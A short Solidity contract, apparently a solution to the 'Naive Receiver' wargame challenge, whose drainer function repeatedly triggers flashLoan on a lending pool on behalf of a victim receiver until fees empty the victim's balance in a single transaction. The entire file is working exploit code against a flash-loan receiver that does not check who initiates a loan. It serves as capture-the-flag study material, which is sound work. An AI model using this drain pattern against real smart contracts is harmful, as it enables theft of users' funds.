pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./NaiveReceiverLenderPool.sol";


contract oneTxSolution {
    function drainer(address payable drainedAccount, address payable addr,  uint256 fakeBorrowAmount) external {
        while(drainedAccount.balance > 0) {
            addr.call(abi.encodeWithSignature(
            "flashLoan(address,uint256)", 
            drainedAccount,
            fakeBorrowAmount));
        }
    }
}